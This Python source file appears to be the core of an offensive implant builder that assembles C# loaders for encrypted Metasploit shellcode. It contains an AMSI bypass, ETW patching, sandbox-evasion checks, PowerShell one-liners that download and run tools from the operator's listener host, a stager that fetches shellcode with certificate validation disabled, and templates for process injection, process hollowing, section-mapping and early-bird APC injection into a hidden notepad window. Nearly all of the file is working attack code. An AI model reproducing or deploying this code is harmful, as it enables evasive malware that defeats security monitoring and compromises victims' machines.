import base64
import netifaces as ni
import os
import subprocess
import sys
import yaml
sys.path.append('./pylib')
import rc4_encrypt
import aes_encrypt

from pylib.libpinvoke import PINVOKE

# References:
# https://github.com/plackyhacker/Shellcode-Injection-Techniques
# https://github.com/Kara-4search/EarlyBirdInjection_CSharp
# https://github.com/0xB455/AmsiBypass/blob/master/Class1.cs

with open('config.yaml', 'r') as file:
  conf = yaml.safe_load(file)

LHOST = ni.ifaddresses(conf['listener']['interface'])[ni.AF_INET][0]['addr']
LPORT = conf['listener']['lport']
WEBROOT_DIR = conf['listener']['webroot_dir']
WEBROOT_URL = conf['listener']['webroot_url']

SHELLCODE_FN = "sc"
STAGER_URL = WEBROOT_URL + SHELLCODE_FN
PS_AMSI = r'''$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)'''
PS_IEX_WEBCLIENT = "IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/{tool}')"
PS_REFLECTIVE_WEBCLIENT = '''$b=(New-object system.net.webclient).DownloadData('http://{LHOST}/{tool}');$a=[System.Reflection.Assembly]::Load($b);[{tool_namespace}.{tool_classname}]::{entrypoint}({cmd})'''
PS_RUNTXT_CMD = f"IEX(New-Object Net.WebClient).downloadString('http://{LHOST}/run.txt')"
PS_UNZIP_CMD = "wget http://{LHOST}/{tool} -o C:\\\\windows\\\\tasks\\\\t.zip;Expand-archive -LiteralPath C:\\\\windows\\\\tasks\\\\t.zip -DestinationPath C:\\\\windows\\\\tasks\\\\"
PS_EXE_DL = "wget http://{LHOST}/{tool} -o t.exe;.\\t.exe {cmd}"

ETW_PINVOKE_IMPORT = ["GetProcAddress",
                      "LoadLibrary",
                      "VirtualProtect"]

ETW_CODE_IMPORT = """
private static byte[] getETWPayload()
    {
        if (!is64Bit())
            return Convert.FromBase64String("whQA");
        return Convert.FromBase64String("ww==");
    }
private static void PatchEtw(byte[] patch)
    {
        try
        {
            uint oldProtect;

            var ntdll = LoadLibrary("ntdll.dll");
            var etwEventSend =   GetProcAddress(ntdll, "EtwEventWrite");

            VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, etwEventSend, patch.Length);
        }
        catch
        {
            Console.WriteLine("Error unhooking ETW");
        }
    }
"""

ARCH_DETECTION = """
        private static bool is64Bit()
        {
            if (IntPtr.Size == 4)
                return false;

            return true;
        }
"""

HEURISTICS_PINVOKE_IMPORT = ["Sleep",
                             "VirtualAllocExNuma",
                             "GetCurrentProcess",
                             "FlsAlloc"]

HEURISTICS_CODE = """
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds; if(t2 < 1.5)
    { return; }

    IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
    if (mem == null)
    { return; }

    UInt32 Fls = FlsAlloc(IntPtr.Zero);
    if (Fls == 0xFFFFFFFF)
    {
        return;
    }
"""

URL_DL_CODE = """
	string url = "{STAGER_URL}";

       if (!is64Bit())
	    url = "{STAGER_URL}32";

	ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
	System.Net.WebClient client = new System.Net.WebClient();
	byte[] shellcode = client.DownloadData(url);
"""

# Hardcoded (stageless) shellcode
SC_HARDCODED = """
   byte[] shellcode = new byte[] {{ {enc_shellcode} }};
"""

# Decoder for XOR'd shellcode
SC_XOR_DECODER = """
  for (int i = 0; i < shellcode.Length; i++)
  {{
    shellcode[i] = (byte)(((uint)shellcode[i] ^ {enc_key}) & 0xFF);
  }}
"""

# Decoder for RC4 shellcode
SC_RC4_DECODER = """
    byte[] key = System.Text.Encoding.ASCII.GetBytes("{enc_key}");
    RC4 rc4 = new RC4(key);
    rc4.DecryptInPlace(shellcode);
"""

# Decoder for AES shellcode
SC_AES_DECODER = """
  string AESKey = "{enc_key}";
  string AESIV = "{enc_iv}";
  shellcode = DecryptInPlace(shellcode, AESKey, AESIV);
"""

ETW_MAIN_CODE = "PatchEtw(getETWPayload());"

RC4_DECRYPT_IMPORT = """
public class RC4
{
    private byte[] S;
    private byte[] T;

    public RC4(byte[] key)
    {
        Initialize(key);
    }

    private void Initialize(byte[] key)
    {
        S = new byte[256];
        T = new byte[256];

        for (int i = 0; i < 256; i++)
        {
            S[i] = (byte)i;
            T[i] = key[i % key.Length];
        }

        int j = 0;
        for (int i = 0; i < 256; i++)
        {
            j = (j + S[i] + T[i]) % 256;
            Swap(S, i, j);
        }
    }

    private void Swap(byte[] array, int i, int j)
    {
        byte temp = array[i];
        array[i] = array[j];
        array[j] = temp;
    }

    public void DecryptInPlace(byte[] ciphertext)
    {
        int i = 0, j = 0;

        for (int k = 0; k < ciphertext.Length; k++)
        {
            i = (i + 1) % 256;
            j = (j + S[i]) % 256;
            Swap(S, i, j);
            int t = (S[i] + S[j]) % 256;
            ciphertext[k] = (byte)(ciphertext[k] ^ S[t]);
        }
    }
}
"""

AES_DECRYPT_IMPORT = """
private static byte[] DecryptInPlace(byte[] ciphertext, string AESKey, string AESIV)
{
    byte[] key = System.Text.Encoding.UTF8.GetBytes(AESKey);
    byte[] IV = System.Text.Encoding.UTF8.GetBytes(AESIV);

    using (Aes aesAlg = Aes.Create())
    {
        aesAlg.Key = key;
        aesAlg.IV = IV;
        aesAlg.Padding = PaddingMode.None;

        ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

        using (MemoryStream memoryStream = new MemoryStream(ciphertext))
        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
        {
            int bytesRead = cryptoStream.Read(ciphertext, 0, ciphertext.Length);
            Array.Resize(ref ciphertext, bytesRead);
            return ciphertext;
        }
    }
}
"""

START_PROCESS_INJECT_PINVOKE_IMPORT = ["VirtualAllocEx",
                                      "OpenProcess",
                                      "WriteProcessMemory",
                                      "CreateRemoteThread",
                                      "ShowWindow",]

START_SHELLCODE_PINVOKE_IMPORT = ["VirtualAlloc",
                                 "CreateThread",
                                 "WaitForSingleObject",]

START_SHELLCODE_CODE_IMPORT = """
            UInt32 MEM_COMMIT = 0x3000;
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
"""

START_PROCESS_INJECT = """
          ProcessStartInfo start = new ProcessStartInfo();
          start.Arguments = ""; 
          start.FileName = "notepad.exe";
          start.WindowStyle = ProcessWindowStyle.Normal;
          start.CreateNoWindow = false;
          int exitCode;
          // Run the external process & wait for it to finish
          using (Process proc = Process.Start(start))
          {
            if (proc != null) {
              int pid = proc.Id;
              IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
              IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
              IntPtr outSize;
              WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);
              IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
              System.Threading.Thread.Sleep(100);
              ShowWindow(proc.MainWindowHandle, 0);
            }
               proc.WaitForExit();
               // Retrieve the app's exit code
               exitCode = proc.ExitCode;
          }
"""

START_PROCESS_HOLLOW_PINVOKE_IMPORT =  ["CreateProcess",
                                       "ZwQueryInformationProcess",
                                       "ReadProcessMemory",
                                       "WriteProcessMemory",
                                       "ResumeThread",]

START_PROCESS_HOLLOW_CODE_IMPORT = """
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
                public Int32 cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public Int32 dwX;
                public Int32 dwY;
                public Int32 dwXSize;
                public Int32 dwYSize;
                public Int32 dwXCountChars;
                public Int32 dwYCountChars;
                public Int32 dwFillAttribute;
                public Int32 dwFlags;
                public Int16 wShowWindow;
                public Int16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
                public IntPtr ExitStatus;
                public IntPtr PebAddress;
                public IntPtr AffinityMask;
                public IntPtr BasePriority;
                public IntPtr UniquePID;
                public IntPtr InheritedFromUniqueProcessId;
        }

"""

START_PROCESS_HOLLOW_CODE = """
      STARTUPINFO si = new STARTUPINFO();

      PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

      bool res = CreateProcess(null, System.Text.Encoding.Default.GetString(procname), IntPtr.Zero,
              IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

      PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
      uint tmp = 0;
      IntPtr hProcess = pi.hProcess;

      ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
      IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
      byte[] addrBuf = new byte[IntPtr.Size];
      IntPtr nRead = IntPtr.Zero;

      ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

      IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

      byte[] data = new byte[0x200];
      ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

      uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);

      uint opthdr = e_lfanew_offset + 0x28;

      uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

      IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
      WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
      ResumeThread(pi.hThread);
"""

START_PROCESS_INTERPROCESS_PINVOKE_IMPORT = ["NtUnmapViewOfSection",
                                            "NtClose",
                                            "NtCreateSection",
                                            "NtMapViewOfSection",
                                            "RtlCreateUserThread",
                                            "ShowWindow"]

START_PROCESS_INTERPROCESS_CODE_IMPORT = """

        [Flags]
	public enum SectionAccess : UInt32
	{
            SECTION_EXTEND_SIZE = 0x0010,
            SECTION_QUERY = 0x0001,
            SECTION_MAP_WRITE = 0x0002,
			SECTION_MAP_READ = 0x0004,
			SECTION_MAP_EXECUTE = 0x0008,
			SECTION_ALL_ACCESS = 0xe
        }
        public enum MemoryProtection : UInt32
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        [Flags]
        public enum MappingAttributes : UInt32
        {
            SEC_COMMIT = 0x8000000,
            SEC_IMAGE = 0x1000000,
            SEC_IMAGE_NO_EXECUTE = 0x11000000,
            SEC_LARGE_PAGES = 0x80000000,
            SEC_NOCACHE = 0x10000000,
            SEC_RESERVE = 0x4000000,
            SEC_WRITECOMBINE = 0x40000000
        }

	[StructLayout(LayoutKind.Sequential, Pack = 0)]
         public struct CLIENT_ID
		{
			public IntPtr UniqueProcess;
			public IntPtr UniqueThread;
		}
"""

START_PROCESS_INTERPROCESS_CODE = """
          ProcessStartInfo start = new ProcessStartInfo();
          start.Arguments = ""; 
          start.FileName = "notepad.exe";
          start.WindowStyle = ProcessWindowStyle.Normal;
          start.CreateNoWindow = false;
          int exitCode;
          // Run the external process & wait for it to finish
          using (Process proc = Process.Start(start))
          {
              if (proc != null) {
                int pid = proc.Id;
              Process target = Process.GetProcessById(pid);
              IntPtr hSectionHandle = IntPtr.Zero;
              IntPtr pLocalView = IntPtr.Zero;
              UInt64 size = (UInt32)shellcode.Length;
              UInt32 result = NtCreateSection(ref hSectionHandle, SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, ref size, MemoryProtection.PAGE_EXECUTE_READWRITE, MappingAttributes.SEC_COMMIT, IntPtr.Zero);
              const UInt32 ViewUnmap = 0x2;
              UInt64 offset = 0;
              result = NtMapViewOfSection(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, MemoryProtection.PAGE_READWRITE);
              Marshal.Copy(shellcode, 0, pLocalView, shellcode.Length);
              IntPtr pRemoteView = IntPtr.Zero;
              NtMapViewOfSection(hSectionHandle, target.Handle, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, MemoryProtection.PAGE_EXECUTE_READ);
              IntPtr hThread = IntPtr.Zero;
              CLIENT_ID cid = new CLIENT_ID();
              RtlCreateUserThread(target.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);
              System.Threading.Thread.Sleep(100);
              ShowWindow(proc.MainWindowHandle, 0);
              }
         }
"""


START_PROCESS_EARLYBIRD_PINVOKE_IMPORT = ["VirtualAllocEx2",
                                         "OpenProcess",
                                         "CreateRemoteThread2",
                                         "QueueUserAPC",
                                         "ResumeThread",
                                         "CloseHandle",
                                         "NtWriteVirtualMemory",
                                         "RtlZeroMemory",
                                         "WaitForSingleObject",
                                         "ShowWindow",]

START_PROCESS_EARLYBIRD_CODE_IMPORT = """
                [Flags]
        public enum NTSTATUS : uint
        {
            Success = 0,
            Informational = 0x40000000,
            Error = 0xc0000000
        }


        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum AllocationProtect : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [Flags]
        public enum CreationFlags : uint
        {
            RunImmediately = 0,
            CREATE_SUSPENDED = 0x00000004,
            STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000
        }
"""

START_PROCESS_EARLYBIRD_CODE = """
          ProcessStartInfo start = new ProcessStartInfo();
          start.Arguments = ""; 
          start.FileName = "notepad.exe";
          start.WindowStyle = ProcessWindowStyle.Normal;
          start.CreateNoWindow = false;
          int exitCode;
          // Run the external process & wait for it to finish
          using (Process proc = Process.Start(start))
          {
            if (proc != null) {
              int pid = proc.Id;
              IntPtr Process_handle = OpenProcess((uint)ProcessAccessFlags.All, false, pid);
              IntPtr VAlloc_address = VirtualAllocEx(
                  Process_handle, 
                  IntPtr.Zero, 
                  (uint)shellcode.Length, 
                  AllocationType.Commit, 
                  AllocationProtect.PAGE_EXECUTE_READWRITE);
    
              IntPtr shellcode_address = Marshal.AllocHGlobal(shellcode.Length);
              RtlZeroMemory(shellcode_address, shellcode.Length);
  
              UInt32 getsize = 0;
              NTSTATUS ntstatus = NtWriteVirtualMemory(Process_handle, VAlloc_address, shellcode, (uint)shellcode.Length, ref getsize);
  
              IntPtr Thread_id = IntPtr.Zero;
              IntPtr Thread_handle = CreateRemoteThread(
                  Process_handle, 
                  IntPtr.Zero, 
                  0, 
                  (IntPtr)0xfff,
                  IntPtr.Zero, 
                  (uint)CreationFlags.CREATE_SUSPENDED, 
                  out Thread_id);
  
              QueueUserAPC(VAlloc_address, Thread_handle, 0);
              ResumeThread(Thread_handle);
              CloseHandle(Process_handle);
              CloseHandle(Thread_handle);
              System.Threading.Thread.Sleep(100);
              ShowWindow(proc.MainWindowHandle, 0);
            }
            }
"""

import_choices_pinvoke_import = {
  'hollow':START_PROCESS_HOLLOW_PINVOKE_IMPORT,
  'interprocess':START_PROCESS_INTERPROCESS_PINVOKE_IMPORT,
  'earlybird':START_PROCESS_EARLYBIRD_PINVOKE_IMPORT,
  'standard':START_SHELLCODE_PINVOKE_IMPORT,
}

import_choices_code_import = {
  'hollow':f"{START_PROCESS_HOLLOW_CODE_IMPORT}",
  'interprocess':f"{START_PROCESS_INTERPROCESS_CODE_IMPORT}",
  'earlybird':f"{START_PROCESS_EARLYBIRD_CODE_IMPORT}",
  'standard':f"{START_SHELLCODE_CODE_IMPORT}"
}

main_choices = {
  'hollow':"""
    byte[] procname = new byte[] {{ {xor_path} }};

    for (int i = 0; i < procname.Length; i++)
    {{
        procname[i] = (byte)(((uint)procname[i] ^ {xor_key}) & 0xFF);
    }}

    {ak.START_PROCESS_HOLLOW_CODE}""",
  'interprocess':"{ak.START_PROCESS_INTERPROCESS_CODE}",
  'earlybird':"{ak.START_PROCESS_EARLYBIRD_CODE}",
  'standard':"{ak.START_SHELLCODE}",
}

def get_pinvoke_import(pinvoke):
  return f"{PINVOKE[pinvoke]}"

class Obfuscator:
  def __init__(self, string, xor_key=b'\00'):
    self.raw = string
    self.key = xor_key
    self.encoded = [ a ^ b for (a,b) in zip(self.raw, self.key*len(self.raw)) ]

  def get_hex_csharp(self):
    return ",".join("0x%02x" % b for b in self.encoded)

  def get_bytes(self):
    return bytes(self.encoded)

  def get_b64(self):
    return base64.b64encode(bytes(self.encoded))

  def get_hex_c(self):
    return "".join("\\x%02x" % b for b in self.encoded)

  def get_hex_csharp(self):
    return ",".join("0x%02x" % b for b in self.encoded)

  def get_hex_vba(self):
    return ",".join("%02d" % b for b in self.encoded)

  def get_key_csharp(self):
    return "".join("0x%02x" % b for b in self.key)

  def get_key_ascii(self):
    return self.key.decode("utf-8")


class ShellCode(Obfuscator):
  def __init__(self, msf_cmd, xor_key=b'\00', caesar_key=0, rc4_key=None, aes_key=None, aes_iv=None):
    """
    raw is the unencrypted shellcode
    key is the key used to encrypt/encode the shellcode
    encoded is the encrypted/encoded shellcode
    """

    # Generate shellcode with MSF
    self.raw = subprocess.check_output(msf_cmd, shell=True)

    # Set key
    if rc4_key is not None:
      self.key = rc4_key
      self.encoded = rc4_encrypt.encrypt(plaintext=self.raw, key=self.key)
    elif aes_key is not None:
      self.key = aes_key.encode('utf-8')
      self.iv = aes_iv.encode('utf-8')
      self.encoded = aes_encrypt.encrypt_bytes(self.raw, self.key, self.iv)
    else:
      self.key = xor_key
      self.encoded = [ a ^ b for (a,b) in zip(self.raw, self.key*len(self.raw)) ]

class Implant:
  def __init__(self, template, base_name):
    self.template = template
    self.base_name = base_name

  def compile(self):
    pass


def write_file(filename, content):
   flag = "w"

   if type(content) is bytes:
      flag = "wb"

   f = open(filename, flag)
   f.write(content)
   print("Wrote to: " + filename)
   f.close()

def cs_compile(filename, flags=""):
  cmd = f"mcs {flags} {filename}"
  print("Compiling source file " + filename)
  os.system(cmd)
